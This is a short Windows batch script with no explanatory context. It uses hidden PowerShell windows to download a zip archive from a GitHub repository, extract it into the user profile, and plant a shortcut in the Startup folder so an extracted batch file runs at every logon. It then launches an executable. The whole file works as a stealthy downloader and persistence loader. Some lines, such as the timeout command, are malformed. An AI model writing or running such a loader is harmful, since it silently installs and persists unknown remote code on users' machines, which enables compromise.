@echo off

PowerShell.exe -WindowStyle hidden -Command "Invoke-WebRequest -Uri https://github.com/peasiodjoaskdsa/mor/raw/main/lp.zip -OutFile '%USERPROFILE%\lp\lp.zip'"
timeout
/t 10/nobreak
PowerShell.exe -NoProfile -WindowStyle hidden -Command "cd '%USERPROFILE%'; Expand-Archive -Path 'lp.zip' -DestinationPath '%USERPROFILE%\lp' -Force"
set SourceExe=%USERPROFILE%\lp\Shortcut.bat
set DestinationPath=%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\SHORTCUT.lnk
powershell.exe -WindowStyle hidden -Command "$WshShell = New-Object -comObject WScript.Shell; $Shortcut = $WshShell.CreateShortcut('%DestinationPath%'); $Shortcut.TargetPath = '%SourceExe%'; $Shortcut.Save()"
start "" XP.exe